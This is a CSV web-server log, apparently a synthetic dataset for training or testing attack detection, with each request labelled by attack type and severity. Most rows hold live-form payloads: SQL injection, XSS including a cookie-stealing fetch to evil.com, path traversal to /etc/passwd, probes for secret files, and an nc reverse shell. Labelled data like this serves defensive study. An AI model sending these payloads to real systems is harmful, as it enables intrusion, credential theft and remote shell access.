timestamp,src_ip,dst_ip,http_method,uri,status_code,bytes,user_agent,attack_type,severity
2024-01-15 08:01:12,185.220.101.45,192.168.1.10,GET,/login.php?id=1' OR '1'='1,400,512,Mozilla/5.0,SQLi,HIGH
2024-01-15 08:01:15,185.220.101.45,192.168.1.10,GET,/login.php?id=1 UNION SELECT username password FROM users--,400,512,Mozilla/5.0,SQLi,HIGH
2024-01-15 08:01:18,185.220.101.45,192.168.1.10,POST,/login.php,200,1024,Mozilla/5.0,SQLi,HIGH
2024-01-15 08:02:00,185.220.101.45,192.168.1.10,GET,/login.php?id=1 AND SLEEP(5)--,200,512,Mozilla/5.0,SQLi_Blind,HIGH
2024-01-15 08:02:30,185.220.101.45,192.168.1.10,GET,/login.php?id=1 AND 1=CONVERT(int SELECT CHAR(65)),400,512,Mozilla/5.0,SQLi,HIGH
2024-01-15 08:03:00,45.33.32.156,192.168.1.10,GET,/search?q=<script>alert(document.cookie)</script>,400,512,python-requests/2.28,XSS,MEDIUM
2024-01-15 08:03:05,45.33.32.156,192.168.1.10,GET,/search?q=<img src=x onerror=alert(1)>,400,512,python-requests/2.28,XSS,MEDIUM
2024-01-15 08:03:10,45.33.32.156,192.168.1.10,POST,/comment,200,256,python-requests/2.28,XSS_Stored,HIGH
2024-01-15 08:04:00,203.0.113.42,192.168.1.10,POST,/login.php,401,256,curl/7.68.0,BruteForce,HIGH
2024-01-15 08:04:01,203.0.113.42,192.168.1.10,POST,/login.php,401,256,curl/7.68.0,BruteForce,HIGH
2024-01-15 08:04:02,203.0.113.42,192.168.1.10,POST,/login.php,401,256,curl/7.68.0,BruteForce,HIGH
2024-01-15 08:04:03,203.0.113.42,192.168.1.10,POST,/login.php,401,256,curl/7.68.0,BruteForce,HIGH
2024-01-15 08:04:04,203.0.113.42,192.168.1.10,POST,/login.php,401,256,curl/7.68.0,BruteForce,HIGH
2024-01-15 08:04:05,203.0.113.42,192.168.1.10,POST,/login.php,401,256,curl/7.68.0,BruteForce,HIGH
2024-01-15 08:04:06,203.0.113.42,192.168.1.10,POST,/login.php,401,256,curl/7.68.0,BruteForce,HIGH
2024-01-15 08:04:07,203.0.113.42,192.168.1.10,POST,/login.php,401,256,curl/7.68.0,BruteForce,HIGH
2024-01-15 08:04:08,203.0.113.42,192.168.1.10,POST,/login.php,401,256,curl/7.68.0,BruteForce,HIGH
2024-01-15 08:04:09,203.0.113.42,192.168.1.10,POST,/login.php,401,256,curl/7.68.0,BruteForce,HIGH
2024-01-15 08:04:10,203.0.113.42,192.168.1.10,POST,/login.php,200,2048,curl/7.68.0,BruteForce_Success,CRITICAL
2024-01-15 08:05:00,198.51.100.77,192.168.1.10,GET,/admin/../../../etc/passwd,400,128,Nikto/2.1.6,PathTraversal,HIGH
2024-01-15 08:05:02,198.51.100.77,192.168.1.10,GET,/admin/../../../../windows/win.ini,400,128,Nikto/2.1.6,PathTraversal,HIGH
2024-01-15 08:05:04,198.51.100.77,192.168.1.10,GET,/.env,200,512,Nikto/2.1.6,SensitiveFile,CRITICAL
2024-01-15 08:05:06,198.51.100.77,192.168.1.10,GET,/wp-config.php,200,1024,Nikto/2.1.6,SensitiveFile,CRITICAL
2024-01-15 08:05:08,198.51.100.77,192.168.1.10,GET,/backup.zip,200,10240,Nikto/2.1.6,SensitiveFile,CRITICAL
2024-01-15 08:06:00,10.0.0.5,192.168.1.10,GET,/api/users,200,4096,Mozilla/5.0,Normal,LOW
2024-01-15 08:06:05,10.0.0.5,192.168.1.10,POST,/api/login,200,512,Mozilla/5.0,Normal,LOW
2024-01-15 08:06:10,10.0.0.6,192.168.1.10,GET,/dashboard,200,8192,Mozilla/5.0,Normal,LOW
2024-01-15 08:07:00,91.108.4.100,192.168.1.10,GET,/login.php?cmd=cat /etc/passwd,400,256,sqlmap/1.7,CMDInjection,CRITICAL
2024-01-15 08:07:05,91.108.4.100,192.168.1.10,GET,/login.php?cmd=whoami,400,256,sqlmap/1.7,CMDInjection,CRITICAL
2024-01-15 08:07:10,91.108.4.100,192.168.1.10,GET,/login.php?cmd=nc -e /bin/sh 91.108.4.100 4444,400,256,sqlmap/1.7,ReverseShell,CRITICAL
2024-01-15 08:08:00,185.220.101.45,192.168.1.10,GET,/login.php?id=1' OR '1'='1,400,512,Mozilla/5.0,SQLi,HIGH
2024-01-15 08:08:03,185.220.101.45,192.168.1.10,GET,/login.php?id=2 UNION SELECT table_name FROM information_schema.tables--,400,512,Mozilla/5.0,SQLi,HIGH
2024-01-15 08:09:00,203.0.113.42,192.168.1.10,POST,/login.php,401,256,curl/7.68.0,BruteForce,HIGH
2024-01-15 08:09:01,203.0.113.42,192.168.1.10,POST,/login.php,401,256,curl/7.68.0,BruteForce,HIGH
2024-01-15 08:09:02,203.0.113.42,192.168.1.10,POST,/login.php,401,256,curl/7.68.0,BruteForce,HIGH
2024-01-15 08:10:00,10.0.0.7,192.168.1.10,GET,/report,200,2048,Mozilla/5.0,Normal,LOW
2024-01-15 08:10:30,45.33.32.156,192.168.1.10,GET,/search?q=<svg onload=fetch('http://evil.com?c='+document.cookie)>,400,512,python-requests/2.28,XSS_Advanced,HIGH
2024-01-15 08:11:00,198.51.100.77,192.168.1.10,GET,/phpmyadmin/,200,4096,Nikto/2.1.6,AdminPanel,HIGH
2024-01-15 08:11:05,198.51.100.77,192.168.1.10,GET,/admin/,200,4096,Nikto/2.1.6,AdminPanel,HIGH
2024-01-15 08:12:00,172.16.0.50,192.168.1.10,GET,/dashboard,200,8192,Mozilla/5.0,Normal,LOW
